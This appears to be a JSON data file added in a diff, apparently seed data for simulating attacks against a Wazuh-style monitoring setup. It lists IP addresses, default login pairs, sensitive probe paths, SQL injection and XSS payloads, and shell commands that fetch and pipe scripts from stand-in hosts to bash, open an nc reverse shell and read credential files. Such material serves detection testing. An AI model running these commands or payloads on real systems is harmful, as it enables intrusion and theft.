@@ -1,0 +1,70 @@
+{
+  "ipPool": [
+    "185.220.101.45", "185.220.102.253", "185.220.103.7",
+    "91.108.4.35", "91.108.56.130", "1.180.245.12",
+    "45.33.32.156", "45.56.79.23", "194.165.16.4",
+    "89.163.254.9", "5.188.87.22", "179.43.128.10",
+    "103.253.41.45", "172.245.6.78", "198.199.80.10",
+    "77.247.109.20", "62.210.115.35", "159.89.46.32"
+  ],
+
+  "userPassPool": [
+    {"u": "root",    "p": "root"},
+    {"u": "admin",   "p": "admin"},
+    {"u": "root",    "p": "123456"},
+    {"u": "ubuntu",  "p": "ubuntu"},
+    {"u": "pi",      "p": "raspberry"},
+    {"u": "guest",   "p": "guest"},
+    {"u": "test",    "p": "test"},
+    {"u": "root",    "p": "toor"},
+    {"u": "admin",   "p": "password"},
+    {"u": "oracle",  "p": "oracle"},
+    {"u": "postgres","p": "postgres"},
+    {"u": "user",    "p": "user"},
+    {"u": "root",    "p": ""},
+    {"u": "admin",   "p": "1234"},
+    {"u": "support", "p": "support"}
+  ],
+
+  "webPaths": [
+    "/admin", "/phpmyadmin", "/.env", "/wp-admin/", "/backup.sql",
+    "/config.php", "/admin/login", "/../../../etc/passwd",
+    "/api/v1/users", "/.git/config", "/actuator/env",
+    "/console", "/.aws/credentials", "/wp-config.php"
+  ],
+
+  "sqlPayloads": [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "1; DROP TABLE users--",
+    "' UNION SELECT username,password FROM users--",
+    "admin'--"
+  ],
+
+  "xssPayloads": [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(1)>",
+    "javascript:alert(document.cookie)"
+  ],
+
+  "commands": [
+    "whoami",
+    "cat /etc/passwd",
+    "uname -a",
+    "wget http://malware.example.com/shell.sh -O /tmp/s && bash /tmp/s",
+    "curl http://c2.example.com/bot | bash",
+    "python3 -c 'import socket,subprocess,os;...'",
+    "nc -e /bin/bash 10.0.0.1 4444",
+    "crontab -e",
+    "cat /root/.ssh/authorized_keys"
+  ],
+
+  "wazuhRules": [
+    {"id": "5710", "level": 12, "desc": "sshd: Attempt to login using a denied user"},
+    {"id": "5503", "level": 10, "desc": "sshd: Maximum authentication attempts exceeded"},
+    {"id": "31151", "level": 9,  "desc": "Web server 400 error code (Bad Request)."},
+    {"id": "86601", "level": 12, "desc": "Shellshock attack detected"},
+    {"id": "100001","level": 14, "desc": "Mimikatz execution detected"},
+    {"id": "510",   "level": 7,  "desc": "Host-based anomaly detection event (rootcheck)."}
+  ]
+}
